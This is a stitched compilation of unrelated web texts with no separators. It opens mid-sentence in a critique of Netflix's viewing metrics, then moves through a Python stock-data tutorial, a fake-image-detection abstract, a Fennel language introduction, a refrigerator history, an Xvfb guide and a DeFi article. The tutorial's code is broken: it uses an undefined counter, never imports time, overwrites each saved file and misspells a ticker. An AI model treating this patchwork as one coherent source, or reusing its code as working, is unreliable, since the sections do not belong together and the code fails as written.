metrics.</p><p>Here is what Netflix shared with the <a href="http://data.parliament.uk/writtenevidence/committeeevidence.svc/evidencedocument/communications-committee/public-service-broadcasting-in-the-age-of-video-on-demand/written/104558.html">United Kingdom’s House of Lords’ Communications Committee</a>:</p><blockquote><p>The information we give them mainly consists of “starters” (i.e. households that watch two minutes of a film or one episode) and “completers” (i.e. households that watch 90% of a film or season of a series) for the first seven and 28 days on Netflix. We believe that these two metrics will give our creative partners a broader understanding of how members engage with their title from start to finish. We also selectively share “watchers” (i.e. households that watch 70% of a film or single episode of a series) with both the public and with creators. Depending on how useful our partners find this data, we will consider sharing it in more countries outside Europe and North America.</p></blockquote><p>Distilling this into the main classifications, we get:-</p><ul><li><strong>starters</strong>: households that watch two minutes of a film or one episode</li><li><strong>watchers</strong>: households that watch 70% of a film or single episode of a series</li><li><strong>completers</strong>: households that watch 90% of a film or season of a series</li></ul><p>Only 2 mins? Which 2 minutes - from the beginning, in the middle, or from the point they left off the previous day?</p><p>In the <a href="https://s22.q4cdn.com/959853165/files/doc_financials/2019/q4/FINAL-Q4-19-Shareholder-Letter.pdf">Q4 2019 letter shared by Netflix to its shareholders</a>, Netflix reveals their definition of a view and its impact on its data reports. I’ve copy-pasted the relevant section here and highlighted the important parts.</p><blockquote><p>As we’ve expanded our original content, we’ve been working on how to best share content highlights that demonstrate popularity. <strong>Given that we now have titles with widely varying lengths - from short episodes (e.g. ​Special​ at around 15 minutes) to long films (e.g. ​The Highwaymen​ at 132 minutes), we believe that reporting households viewing a title based on 70% of a single episode of a series or of an entire film, which we have been doing, makes less sense.</strong> We are now reporting on households (accounts) that chose to watch a given title . Our new methodology is similar to the BBC iPlayer in their rankings​ based on “requests” for the title, “most popular” articles on the New York Times which include those who opened the articles, and YouTube view counts. <strong>This way, short and long titles are treated equally, leveling the playing field for all types of our content including interactive content, which has no fixed length. The new metric is about 35% higher on average than the prior metric.</strong> For example, 45m member households chose to watch ​Our Planet​ under the new metric vs. 33m under the prior metric.</p></blockquote><p>Buried in a footnote on the same page in the <a href="https://s22.q4cdn.com/959853165/files/doc_financials/2019/q4/FINAL-Q4-19-Shareholder-Letter.pdf">Q4 2019 shareholder letter</a> is an explanation of what “chose to watch a given title” means -</p><blockquote><p>Chose to watch and did watch for at least 2 minutes – long enough to indicate the choice was intentional – is the precise definition</p></blockquote><p>Netflix says that this method of reporting is similar to what the BBC and YouTube do, and so, they aren’t doing anything funny here.</p><p>Well, summarizing everything till now, it appears that Netflix counts how many sessions lasted at least 2 minutes and this metric is used to quantify their audience.</p><h2 id="the-issue-with-reporting-based-on-starters">The Issue with Reporting Based on “starters”</h2><p>Portraying a movie’s popularity based solely on “starters” is where things begin to get weird for me.</p><p>Having spent a few years in the video analytics industry, I can say with absolute confidence that a large number of views does not * <strong>always</strong> * translate to popularity. There are caveats one has to consider and some amount of data cleansing and outlier removal is needed before drawing broad conclusions.</p><p>When I look at such viewership statistics, a few questions come to mind immediately.</p><ul><li>How long was each view (beyond the 2 minute minimum i.e.)?</li><li>When did each view begin and end (i.e., start and end times)?</li><li>How many views or sessions did a person take to completely watch a movie?</li></ul><p>Note: “completely” generally means 90% of the playtime of a movie and this is considered as an acceptable threshold in the industry because people generally skip the credits.</p><p>Now, let’s understand with the help of a few examples of why these questions are important in making sense of an audience’s engagement.</p><h3 id="problem-1-if-a-person-watches-only-2-minutes-that-should-not-count-towards-the-movies-popularity">Problem 1: if a person watches only 2 minutes, that should not count towards the movie’s popularity.</h3><p><strong>Example 1:</strong> if a person began to watch Extraction, watched it for 2 mins, found it utterly boring, and decided to bail on it after just 3 minutes, then do you count it as a view or a starter? Well, logically speaking - he did start the movie, but, when you take this number without context (the viewer dropped out after 3 minutes) and use it to justify a movie’s “popularity”, it’s not right.</p><p><strong>Example 2:</strong> Let’s assume that Netflix acquires the “Oceans” franchise and decides to produce the “Oceans 21” with 21 A-Listers from Hollywood. And by a cruel twist-of-fate, they produce a movie with the worst possible storyline and direction. However, what they do get right is marketing! Netflix pulls out all the stops and does a brilliant job at marketing the movie and building up excitement for Oceans 21.</p><p>On the day of release, Oceans 21 gets millions of hits because people are excited to see George Clooney and Brad Pitt crush it! But, what’s happening?</p><ul><li>10 minutes into the movie, most of the viewers realize that the movie sucks and stop watching. But, they are added to the movie’s popularity count because they watched 2 mins, right?</li><li>a section of Netflix’s subscribers who haven’t (yet) heard that the movie sucks end up watching at least 10 mins of the movie before bleeding out of their eyes. But, they too are added to the “watch” count because they watched 2 mins, right?</li><li>and, the die-hard fans of the Oceans’ franchise will watch it no matter what the critics say and of course, they are going to be added to the “watch” count.</li></ul><h3 id="problem-2-multiple-viewing-sessions-from-the-same-subscriber-arent-considered">Problem 2: Multiple Viewing Sessions from the Same Subscriber Aren’t Considered</h3><p>The definition of “starter” also does not take consider multiple viewing sessions and this is an issue. Let’s take a simple example to understand more.</p><p><strong>Case A:</strong> I might have watched a single movie over a period of 10 days watching 10-15 mins each day, because I need to split my day between work, babysitting my toddlers, yard-work, etc.</p><p><strong>Case B:</strong> Now consider another situation where I had the entire Saturday night to myself and watched an entire 1.5 hour movie in one sitting.</p><p>So, is A more popular than B? It will under Netflix’s algorithm because A had 10 “starters” and B had only one.</p><p>Sounds wrong, doesn’t it? Okay, now let’s look at the problem from a different angle.</p><h2 id="does-netflixs-data-translate-to-imdb-and-rotten-tomato-ratings">Does Netflix’s data Translate to IMDB and Rotten Tomato ratings?</h2><p>Take a look at the IMDB and Rotten Tomato ratings for Netflix’s Top 10 list because these ratings play a huge role in a movie’s continued - importantly, after the marketing hype has died down.</p><p>We compiled the IMDB and Rotten Tomato ratings (as of July 16th 2020 at 6 am UTC) and here is what the data shows.</p><p><img src="https://ottverse.com/images/netflix-top10-imdb-rottentomato.png" alt=""></p><p>At first glance, you might think that IMDB appears to agree with Netflix’s popularity chart, but, The Irishman throws a curveball coming in at 7.9 in IMDB and 96% in Rotten Tomato while languishing at #6 in Netflix. The same goes for The Platform which has great ratings from both IMDB and Rotten Tomato, but is at the 9th position in Netflix’s data.</p><p>Let’s look at this data in a different perspective.</p><p><img src="https://ottverse.com/images/ranking-of-movies-netflix-imdb-rottentomato.png" alt=""></p><p>Below is a table where we have ranked the movie based on the audience’s ratings/reviews on IMDB and Rotten Tomato. We have highlighted three movies in particular - Extraction, The Irishman, The Platform to show how different they are ranked based on the data from Netflix, IMDB, and Rotten Tomato.</p><p>Quit different, eh?</p><p>The Platform’s ranking goes to show that a movie might not have the same number of views as more “popular” movies, but, can be highly rated by the audience. So, does Netflix’s methodology have flaws?</p><h2 id="what-data-from-netflix-will-help">What Data from Netflix Will Help?</h2><ul><li><strong>Viewing Trends for 4 weeks:</strong> Instead of providing a single, aggregated number, it will be great if a trendline of the number of “watch"s is released.
This will help us understand the influence of the first few days of release on the overall aggregated figure and how a movie fares after the initial hype has died down.</li><li><strong>Number of Sessions Required to achieve a “Complete” Watch:</strong> How many sessions does the average user take to watch a movie completely? If the average viewer take 3 attempts to watch a movie fully, and if the movie has 30 million views, it probably is safe to assume that the movie wasn’t watched fully 30 million times. Right?</li><li><strong>Session Durations as a function of the length of the Content:</strong> preferably represented as a histogram.</li><li><strong>Internal Ratings:</strong> Can Netflix tell …</li></ul></div></div>

<h2 id="16bb">Anyone Can Do This</h2>



<p>Beginners welcome. I’ve created this guide for Python developers of all skill levels. Maybe you don’t even know what Python is, and that’s okay! I’ve got you. </p>



<p>If you’ve read any of <a href="https://handsoffinvesting.com/guides/" target="_blank" rel="noreferrer noopener">my articles</a> about automating the stock analysis process, you’ve probably seen this code before. I figured that since this program is so integral for algorithmic investing, I need to break it down further and make sure that everyone understands how to use it!</p>



<p>After running this program you’ll be left with a folder on your device that contains the historical data of any number of stocks. Also, I’ve simplified the code by breaking it into sections and giving a description of what each part of the code does.</p>



<p id="bc40">If this is your first time using Python (or coding in general), I’d recommend reading&nbsp;<a href="https://www.codecademy.com/articles/install-python" target="_blank" rel="noreferrer noopener">this article</a>&nbsp;for a simple walk-through of the installation and startup process. And don’t worry, everybody learns how to code through practice. This is a great place to start learning!</p>



<figure><blockquote><p>Programming is a skill best acquired by practice rather than from books. — Alan Turing</p></blockquote></figure>



<hr>



<h2 id="0a66">Libraries</h2>



<p>They make life so much easier. These libraries are going to help us make quick work of the data importing process. Using them, we’ll be able to:</p>



<ol><li>Filter through all of the stocks in the NYSE, NASDAQ, and AMEX. </li><li>Create and delete a file on our local machine (computer) to store the stock data.</li><li>Pull and save historical stock data from Yahoo Finance.</li></ol>



<p id="29d1">Importing the necessary libraries can be done in two simple lines of code.</p>



<div><pre data-lang="Python"><code>import yfinance as yf, pandas as pd, shutil, os
from get_all_tickers import get_tickers as gt</code></pre></div>



<p>Here are the use-cases for each library, as well as where you can go to learn more.</p>



<ul><li><a href="https://pypi.org/project/yfinance/" target="_blank" rel="noreferrer noopener">Yfinance</a>: Gather historical/ relevant data on each stock.</li><li><a href="https://pandas.pydata.org/docs/reference/index.html" target="_blank" rel="noreferrer noopener">Pandas</a>: Work with large sets of data.</li><li><a href="https://docs.python.org/3/library/shutil.html" target="_blank" rel="noreferrer noopener">Shutil</a> and&nbsp;<a href="https://docs.python.org/3/library/os.html" target="_blank" rel="noreferrer noopener">OS</a>: Accessing, creating, and deleting folders/files on the computer.</li><li><a href="https://github.com/shilewenuw/get_all_tickers" target="_blank" rel="noreferrer noopener">Get_All_Tickers</a>: Filter through all stocks to get the list you desire.</li></ul>



<hr>



<h2>The List of Stocks (Tickers)</h2>



<p>The library “<a href="https://github.com/shilewenuw/get_all_tickers" target="_blank" rel="noreferrer noopener">get-all-tickers</a>“, allows us to filter through all of the stocks in the NYSE, NASDAQ, and AMEX. Doing this gives us a list of stock tickers that we can then analyze one at a time. </p>



<p>Currently, the library supports filtering stocks by their <strong>region</strong>, <strong>sector</strong>, <strong>market cap</strong>, and <strong>exchange</strong>. For this example I am looking at companies that have a market cap between $150,000 and $10,000,000 (in millions). You will notice that I also included a line of code to print the number of tickers we are using. </p>



<p><strong><span>This is very important</span></strong><span>:</span></p>



<p>You will need to be sure that you are not targeting more than 2,000 tickers, because the Yfinance API has a 2,000 API calls per hour limit.</p>



<div><pre data-lang="Python"><code>tickers = gt.get_tickers_filtered(mktcap_min=150000, mktcap_max=10000000)
print("The amount of stocks chosen to observe: " + str(len(tickers)))</code></pre></div>



<p><br>I would recommend using this library because it allows for our list of observable stocks to be dynamic. But if it better suits your analysis, here is an alternative line of code that allows you to type in the stocks you would like to have the program analyze.</p>



<div><pre data-lang="Python"><code>tickers = ["FB", "AMZN", "APPL"]</code></pre></div>



<hr>



<h2>Data Storage</h2>



<p>You need to create a file location on your device to store all of the stock data, but it’s not that simple. This file need to remove old stock data and hold in order to hold only data from the latest iteration of this program.</p>



<p>To do this, <strong>first create the file manually on your computer</strong>. Don’t worry, this is the only time you will have to do this. Then add this code to your program.</p>



<div><pre data-lang="Python"><code>shutil.rmtree("C:\\Users\\Your Path to Desired File Location")
os.mkdir("C:\\Users\\Your Path to Desired File Location")</code></pre></div>



<p>These two lines of code will then remove and recreate that file each time you run this program. Doing this allows for you to clear out the old stock data and make room for the most recent data.</p>



<hr>



<h2>Measure Success</h2>



<p>These two basic lines of code create variables that we are going to use in the next section to gauge the success of your program. </p>



<p>Sometimes Yahoo Finance can fail to retrieve the data for all of the stocks. This does not happen <span>often </span>(maybe once in a thousand stocks), but we still want to know if it does. </p>



<div><pre data-lang="Python"><code>Stock_Failure = 0
Stocks_Not_Imported = 0</code></pre></div>



<h2>Pull From Yahoo Finance</h2>



<p>This section of code may look daunting if you’re new to coding, but don’t worry<span>:</span> it’s not too complicated. Here is a high-level overview of what this code is doing.</p>



<ol><li>Create a while loop to iterate over each stock in our list of tickers (also ensuring that we are making less than 1800 calls).</li><li>Try statement. <ol><li>We tell Yahoo Finance which stock we want to get the data for.</li><li>Specify what kind of data we want about the stock (in this example it is all of the historical price data).</li><li>Pull the data and save it as a csv in the folder specified in the above section.</li><li>Force the program to pause for two seconds so that we don’t overwhelm Yahoo Finance and get kicked out.</li><li>Tell our program the process was successful and then iterate to the next stock.</li></ol></li><li>Catch Statement (to catch value errors that Yahoo Finance might throw, otherwise our program will prematurely end).<ol><li>Print that there was an error.</li><li>Check if the observed stock has failed more than 5 times (this threshold is up to you).</li><li>If it has, move on to the next stock.</li><li>If it has not, try again.</li></ol></li><li>We’re done. Print out how many stocks were successfully imported, and how many were not.</li></ol>



<p>If you’re still confused with a section of this code, I added some comments (words after #) to alleviate any confusion.</p>



<div><pre data-lang="Python"><code>i=0
while (i &lt; len(tickers)) and (Amount_of_API_Calls &lt; 1800):
    try:
        stock = tickers[i]  # Gets the current stock ticker
        temp = yf.Ticker(str(stock))  # Instantiate the ticker as a stock with Yahoo Finance
        Hist_data = temp.history(period="max")  # Tells yfinance what kind of data we want about this stock (In this example, all of the historical data)
        Hist_data.to_csv("C:\\Users\\Your Desired Path to File")  # Saves the historical data in csv format for further processing later
        time.sleep(2)  # Pauses the loop for two seconds so we don't cause issues with Yahoo Finance's backend operations
        Amount_of_API_Calls += 1 
        Stock_Failure = 0
        i += 1  # Iteration to the next ticker
    except ValueError:
        print("Yahoo Finance Back-end Error, Attempting to Fix")  # An error occurred on Yahoo Finance's back-end. We will attempt to retreive the data again
        if Stock_Failure &gt; 5:  # Move on to the next ticker if the current ticker fails more than 5 times
            i+=1
            Stocks_Not_Imported += 1
        Amount_of_API_Calls += 1
        Stock_Failure += 1
print("The amount of stocks we successfully imported: " + str(i - Stocks_Not_Imported))</code></pre></div>



<hr>



<h2>The End?</h2>



<p>That’s it. You now have a dynamic way of filtering through all of the stocks in the NYSE, NASDAQ, and AMEX<span>, p</span>ulling each of the company’s historic price data<span>, a</span>nd saving all of it to a new folder on your device. All <span>at </span>the click of a button. </p>



<p><strong>It’s completely hands-off.</strong></p>



<p>But <span>this isn’t</span> the end. There is so much more of the investing process that you can make hands-off. And why wouldn’t you? It makes life so much easier and investing so much more successful. <strong><a href="https://handsoffinvesting.com/" target="_blank" rel="noreferrer noopener">Everything you need is right here!</a></strong></p>

        <p>The quality of image generation and manipulation is reaching impressive levels, making it increasingly difficult for a human to distinguish between what is real and what is fake. However, deep networks can still pick up on the subtle artifacts in these doctored images. We seek to understand what properties of fake images make them detectable and identify what generalizes across different model architectures, datasets, and variations in training. We use a patch-based classifier with limited receptive fields to visualize which regions of fake images are more easily detectable. We further show a technique to exaggerate these detectable properties and demonstrate that, even when the image generator is adversarially finetuned against a fake image classifier, it still leaves detectable artifacts in certain image patches.</p>

						A Brief Summary:
					</p>
					</span>
					We train classifiers in a fully convolutional manner by truncating a standard deep network architecture after various intermediate layers. This classifier is trained to distinguish between real images and fake or manipulated images, but since it is fully convolutional, it provides us with a prediction of how "real" or "fake" it predicts a given patch of the image to be. One subtle caveat was that we had to be careful with image preprocessing -- we tried to create our dataset so that "real" and "fake" image collections are as similar as possible in terms any resizing done and file format, as we found that a classifier could easily learn these differences rather than the actual task.</p><p>
					<img src="https://chail.github.io/patch-forensics/img/preprocess.001.jpeg"></p><p>
					We train the classifier on fake faces from Progressive GAN, and real faces from the CelebA-HQ dataset afer performing the preprocessing steps above. We then evaluate the truncated classifiers at different receptive field sizes, where higher block number corresponds to larger receptive field/larger patch size, across different synthetic face generators, as well as generators trained on the more diverse FFHQ face datset. Oftentimes, a model with a smaller receptive field can outperform one with a larger receptive field on this task.</p><p>
					<img src="https://chail.github.io/patch-forensics/img/graphs.001.jpeg"></p><p>
					Patch-based predictors give use a natural way to visualize model decisions, as the same model weights are applied over each patch in a sliding fashion. By using a pretrained face segmentation model, we can categorize the most predictive patch in each image to investigate what types of features the patch classifier uses in making a decision.</p><p>
					<img src="https://chail.github.io/patch-forensics/img/visualize.001.jpeg"></p><p>
					One of the dangers of image synthesis is that the generators are constantly evolving and getting better, so we investigate how patch cues change as a result of changes in the generator. We finetune the generator and recompute the most predictive patches, and we also use the generator as a tool to exaggerate what makes images look fake by optimizing against the classifier in latent space.</p><p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<header>

</header>
<p>Fennel is a programming language that runs on the Lua runtime.</p>
<h2 id="why-lua">Why Lua?</h2>
<p>The Lua programming language is an excellent and very underrated tool. Is it remarkably powerful yet keeps a very small footprint both conceptually as a language and in terms of the size of its implementation. (The reference implementation consists of about nineteen thousand lines of C and compiles to 278kb.) Partly because it is so simple, Lua is also extremely fast. But the most important thing about Lua is that it’s specifically designed to be put in other programs to make them reprogrammable by the end user.</p>
<p>The conceptual simplicity of Lua stands in stark contrast to other “easy to learn” languages like JavaScript or Python–Lua contains very close to the minimum number of ideas needed to get the job done; only Forth and Scheme offer a comparable simplicity. When you combine this aggressive simplicity with the emphasis on making programs reprogrammable, the result is a powerful antidote to prevailing trends in technology of treating programs as black boxes out of the control of the user.</p>
<h2 id="and-yet">And yet…</h2>
<p>So if Lua is so great, why not just use Lua? In many cases you should! But there are a handful of shortcomings in Lua which over time have shown to be error-prone or unclear. Fennel runs on Lua, and the runtime semantics of Fennel are a subset of Lua’s, but you can think of Fennel as an alternate notation you can use to write Lua programs which helps you avoid common pitfalls. This allows Fennel to focus on doing one thing very well and not get dragged down with things like implementing a virtual machine, a standard library, or profilers and debuggers. Any tool that already works for Lua will work just as well for Fennel.</p>
<p>The most obvious difference between Lua and Fennel is the parens-first syntax; Fennel belongs to the Lisp family of programming languages. You could say that this removes complexity from the grammar; the paren-based syntax is more regular and has fewer edge cases. Simply by virtue of being a lisp, Fennel removes from Lua:</p>
<ul>
<li>statements (everything is an expression),</li>
<li>operator precedence (there is no ambiguity about what comes first), and</li>
<li>early returns (functions always return in tail positions).</li>
</ul>
<h2 id="variables">Variables</h2>
<p>One of the most common legitimate criticisms leveled at Lua is that it makes it easy to accidentally use globals, either by forgetting to add a <code>local</code> declaration or by making a typo. Fennel allows you to use globals in the rare case they are necessary but makes it very difficult to use them by accident.</p>
<p>Fennel also removes the ability to reassign normal locals. If you declare a variable that will be reassigned, you must introduce it with <code>var</code> instead. This encourages cleaner code and makes it obvious at a glance when reassignment is going to happen. Note that Lua 5.4 introduced a similar idea with <code>&lt;const&gt;</code> variables, but since Fennel started from a clean slate it was able to make the cleaner choice be the default rather than opt-in.</p>
<h2 id="tables-and-loops">Tables and Loops</h2>
<p>Lua’s notation for tables (its data structure) feels somewhat dated. It uses curly brackets for both sequential (array-like) and key/value (dictionary-like) tables, while Fennel uses the much more familiar notation of using square brackets for sequential tables and curly brackets for key/value tables.</p>
<p>In addition Lua overloads the <code>for</code> keyword for both numeric “count from X to Y” style loops as well as more generic iterator-based loops. Fennel uses <code>for</code> in the first case and introduces the <code>each</code> form for the latter.</p>
<h2 id="functions">Functions</h2>
<p>Another common criticism of Lua is that it lacks arity checks; that is, if you call a function without enough arguments, it will simply proceed instead of indicating an error. Fennel allows you to write functions that work this way (<code>fn</code>) when it’s needed for speed, but it also lets you write functions which check for the arguments they expect using <code>lambda</code>.</p>

<p>If you’ve been programming in newer languages, you are likely to be spoiled by pervasive destructuring of data structures when binding variables, as well as by pattern matching to write more declarative conditionals. Both these are missing from Lua and included in Fennel.</p>
<p>Finally Fennel includes a macro system so that you can easily extend the language to include new syntactic forms. This feature is intentionally listed last because while lisp programmers have historically made a big deal about how powerful it is, it is relatively rare to encounter situations where such a powerful construct is justified.</p>

					<p>The evolution of the household refrigerator is not a well known story. &nbsp;There seems to be few people interested in the subject. &nbsp;Perhaps it is not as romantic as the development of the automobile. &nbsp;Nonetheless, a concerted effort was put forth in the 1920s and 1930s to produce a cheap, reliable, efficient domestic refrigerator. &nbsp;From books I’m reading on the subject, the great diversity of refrigerator manufacturers in the United States that existed in the 1920s, seems to be boiled down to a handful of companies in the depression era. &nbsp;In the most recent book, “Household Electric Refrigeration” by John F. Wostrel and John G. Praetz 1938; the models described were made by manufacturers, many still around today (or owned by yet larger companies) including General Electric, Frigidaire, Kelvinator, Norge, Grunow, Crosley, Sparton, Hotpoint, Coldspot, Copeland, Ice-O-Matic and Westinghouse.</p>

<p>One of the most noticeable differences between refrigerators in the mid 1930s and today was the refrigerants they used and the refrigerants charges required for operation. &nbsp;A very common refrigerant, Sulpher Dioxide had been in use fora number of years and still appeared to dominate the market at this time, not to say that proprietary chemical refrigerants weren’t beginning to take a large part of the market. &nbsp;F-12 was one of these proprietary substances that would later dominate the refrigerator industry. &nbsp;It was stable up to high temperatures, didn’t stink like SO2 when it leaked, was relatively safe if exposure to it was kept to a minimum, and it has a much lower boiling point than several common refrigerants at the time which means that systems operating F-12 remained in a positive pressure state throughout the cycle. &nbsp;Refrigerators with F-114, SO2, Isobutane and Methyl Formate required a vacuum in the low side of a vapor compression system. &nbsp;This was generally viewed as problematic seeing that if a leak formed in the low side of the system, for instance, around the packing seal of an open drive compressor, atmosphere would leak into the system, bringing non-condensable gases and water vapor. &nbsp;This leads to high head pressures, oil contamination, possible acid formation, corrosion and refrigerant control freeze ups. &nbsp;A curious refrigerant used rarely was Carrene, also known as Dichloromethane which has a boiling point of 104 degrees F at atmospheric pressure. &nbsp;This means both the suction and discharge sides of a system would operate in a vacuum state. &nbsp;Very curious. &nbsp;As I said, the refrigerant charges were unusual as well. &nbsp;The compressors of these systems were rated not much &nbsp;larger than modern day compressors from 1/16 HP up to 1/4 HP, but they had typical charges of 1# to perhaps 3.5# &nbsp;and more depending on the manufacturer. &nbsp;Modern refrigerators have charges measured in ounces, perhaps, 4 oz.. Most of these machines had liquid receivers that held excess refrigerant and ensured a pure liquid supply to the refrigerant control. &nbsp;That excess refrigerant would have allowed continued operation with minor leaks in the system. &nbsp;Another reason for the large charges is the construction of the evaporator which was commonly gravity flooded; a vessel and series of tubes holding refrigerant under low pressure, boiling away to vapor as heat is absorbed from the refrigerated cabinet.<span id="more-4087"></span></p>

<p>Above, is one of these low side float assemblies. &nbsp;These seemed to be falling out of favor by the mid 1930s for various reason having to do with expense and reliability. &nbsp;The float valve simply regulated the volume of liquid refrigerant within the evaporator shell which was maintained at suction pressure. &nbsp;As the refrigerant boiled away and was carried to the compressor, the ball would drop, valve open and additional high pressure liquid would be admitted. &nbsp;When implemented properly, the low side float gravity flooded evaporator has many advantages over the high side float or the dry type evaporator. &nbsp;It was very important that these machines were properly leveled when installed. &nbsp;They definitely had a minimum charge volume below which the float valve would continually call for more refrigerant and when it was not available, the valve would remain open, leaving very little pressure drop between the high and low side resulting in little to no refrigerating effect. &nbsp;A large refrigerant charge could simply be handled with a sufficiently sized liquid receiver. &nbsp;(Also read <a href="https://musingsonentropy.wordpress.com/2013/04/18/the-great-gravity-flooded-evaporator/" target="_blank">The Great Gravity Flooded Evaporator</a>)</p>

<p>This Coldspot has some features worth discussing. &nbsp;For one, it is the package type as described before with the compressor and condensing unit mounted atop the insulated cabinet top with the motor and compressor supported my springs to dampen vibration and noise. &nbsp;The evaporator is of the dry type where the refrigerant is fed to a long coil of tube or series of tubes at approximately the rate in which it is vaporized by the heat of the refrigerated cabinet. &nbsp;Some of the more crude early versions of this used a fixed orifice called a “restrictor”, having a fixed, triangle shaped opening to pass high pressure liquid refrigerant to the evaporator. &nbsp;Before the capillary tube came into use (invented in the late 20s) was the Automatic Expansion Valve which is little more than a pressure regulating valve maintaing a constant pressure within the evaporator coil, often with an adjustable spring compression. &nbsp;This knob or screw would often go out of adjustment because of the constant freeze/thaw occurring at these valves. &nbsp;They were often equipped with a rubber cap or boot to keep moisture from interfering with the adjustment. &nbsp;These AXVs work well in constant load conditions, but under high load tend to starve the evaporator of refrigerant and risk slugging liquid back to the compressor under low load. &nbsp;The improvement to these valves came with the addition of a thermostatic element or “sensor bulb” strapped to the suction line, the temperature of which alters the pressure within the the bulb and in turn, operates a diaphragm inside the valve to properly feed the correct amount of refrigerant to the coil given the conditions. &nbsp;This type of valve would be called a Thermostatic Expansion Valve.</p>

<p>A very simple dry type evaporator with and AXV. &nbsp;Notice the Thermostatic Control Switch. &nbsp;This has nothing to do with the refrigerant supply, but simply controls the electrical current to the compressor and allows the operator to adjust the cabinet temperature. &nbsp;These worked with a thermostatic bulb strapped to the evaporator, suction line or somewhere else in the cabinet. &nbsp;The Thermostat was a great improvement over the controls of the 20s which sometimes used a pressure operated switch tied into the suction line. &nbsp;The service or replacement of these complicated switches could involved breaking the sealed refrigerant line.</p>

<p>An AXV on a dry type coil, but rather than direct expansion, this is a brine tank. &nbsp;The refrigerant tube passes through of a low freezing point brine which in turn froze ice cubes and chilled the space. &nbsp;These had the advantage of having a holdover effect to keep the cabinet cold and prevent short cycling of the compressor and also had a more constant loading effect on the AXV which made for more consistent and predictable performance. &nbsp;The down side of a brine system is the possible corrosive effects of the brine, extra cabinet space taken and the lower evaporator temperatures possibly needed to chill the brine to a temperature that it could in turn chill the refrigerator.</p>

      <h3 id="introduction">Introduction</h3>

<p>Sometimes, when I run some programs, which normally run on a local computer with a graphical display, in Docker container, they would somehow fail. Sometimes, I need to run many simulations that have GUIs simultaneously, and I don’t want to see those GUIs at all. Is there any virtual display which allows me to put the graphics into? The answer is yes and we could use X virtual framebuffer, Xvfb.</p>



<p>In this blog post, I would like to take you to glimpse the X server-client architecture for displaying graphics, and discuss how to use Xvfb.</p>

<h3 id="x-server-client">X Server-Client</h3>

<p>In computing, the X Window System, commonly known as X11 or X, is a network-transparent windowing system for bitmap displays. X uses a client-server model. An X server program runs on a computer with a graphical display and communicates with various client programs.</p>

<div>
<figure>
    <img src="https://leimao.github.io/images/blog/2020-07-01-Running-X-Client-Using-Virtual-X-Server-Xvfb/2000px-X_client_server_example.svg.png">
    <figcaption>X Server-Client Architecture</figcaption>
</figure>
</div>

<p>Any application that requires GUI and interacts with X server program is called X client. X client typically includes applications such as OS GUI, web browser, most of the games, and so on. Without X server, some of those programs would fail to run.</p>



<p>X server requires a graphical display. Without a graphical display, X server will not start and thus all the X clients that must run on a X server would fail.</p>



<p>In some scenarios where X server is not started or there is no display, we would still like to run X clients, we should use a virtual X server to host the X clients. Instead of outputting signals to screen, the virtual X server outputs signals to memory. This will be very useful for running programs, especially those whose display graphics are not important, in Docker container or on remote servers. For example, if you would like to watch a live streaming on a remote server without graphical display and take some snapshots routinely every 5 minutes, virtual X server will be very helpful. In fact, some libraries, such as Matplotlib (without using agg backend) and TikZ requires to be hosted on X server. If there is no display, say in a Docker container, running the programs that use those libraries will fail.</p>

<h3 id="x-virtual-framebuffer-xvfb">X Virtual Framebuffer (Xvfb)</h3>

<p>Xvfb or X virtual framebuffer is a display server implementing the X11 display server protocol. In contrast to other display servers, Xvfb performs all graphical operations in virtual memory without showing any screen output.</p>



<p>To install Xvfb, please run the following commands in the terminal.</p>

<div><div><pre><code><span>$ </span><span>sudo </span>apt update
<span>$ </span><span>sudo </span>apt <span>install </span>xvfb ghostscript
</code></pre></div></div>



<p>Once the <code>xvfb</code> and <code>ghostscript</code> are installed, we could start any X client in the terminal using <code>xvfb-run</code>.</p>

<div><div><pre><code><span>$ </span>xvfb-run firefox
<span>$ </span>xvfb-run python plot.py
</code></pre></div></div>

<h3 id="conclusions">Conclusions</h3>

<p>Xvfb would be very useful for a lot of GUI based simulations running in Docker container or remote server.</p>

<div>
<p>In 2017/18 cryptocurrencies went through a speculative bubble that saw its flagship currency Bitcoin reach peaks of $20,089 and a market cap of $320 billion. At the height of euphoria, the total market cap of all cryptocurrencies reached $790 billion. While Bitcoin and other cryptocurrencies (known as altcoins) have been around since 2009, it was the consolidation of mindshare and public interest in 2017 and 2018 that has made it a mainstay for alternative investors. But the fact remains that we are yet to see the adoption event that will make it a mainstay for all investors.</p>



<p>Most recently Cryptocurrencies have once again found a place in the news cycle following two years of dormancy post the bubble. The central trend appears to be around the phenomenon of decentralised finance otherwise known as DeFi. The quantity of activity and community participation in DeFi and related activities have been pointed to as potential indicators of a return to the speculative mania that took place in 2017. By the end of July, the total value locked up in DeFi related projects was $4 billion. A somewhat marginal amount given that Bitcoin is now over $200 billion in valuation and the whole market for cryptocurrencies is approaching $350 billion.</p>



<p>Regardless, DeFi represents a strong use case for cryptocurrencies as a means to provide lending and borrowing capabilities and is also geared to attract significant speculative interest. One of the most basic and pervasively engaged features of DeFi at present is yield farming. Cryptocurrency assets can earn or ‘farm’ yields in three main forms:</p>



<ol><li>Participating in financial products as one would in traditional markets</li><li>Locking up some cryptocurrency liquidity in return for an interest-like reward.</li><li>Staking cryptocurrency (like collateral) to fortify the security of a Proof-of-Stake based blockchain platform, where ‘staking’ some tokens prevents malicious activity similar to how a collateralized loan prevents default risk.</li></ol>



<p>However, the attention decentralised finance (DeFi) is getting right now, looks more like a bubble than a catalyst for adoption, where volatility (price, scams, hacks etc) of the industry hasn’t been solved.</p>



<p>The question then is, what is a catalyst for adoption? Given that financial products (form 1) on any platforms, blockchain or otherwise, can provide yields through participation, let us focus on yield farming native to the nature of blockchain (forms 2 &amp; 3), Proof-of-Stake – where providing security/liquidity returns yields.</p>



<p>Proof-of-Stake is simply the mechanism whereby a decentralised platform is able to provide security against attacks on the immutability of the ledger on the blockchain. The name holds the key to understanding this mechanism where ‘staking’ (locking up) the currency on the platform, is the means by which you are able to validate transactions on the ledger (the state of the blockchain) and add to the ledger. The game theory of securing the chain via staking is tied to rewards for being a good actor and penalties for being a bad actor. These rewards represent the yields earned for securing the chain.</p>



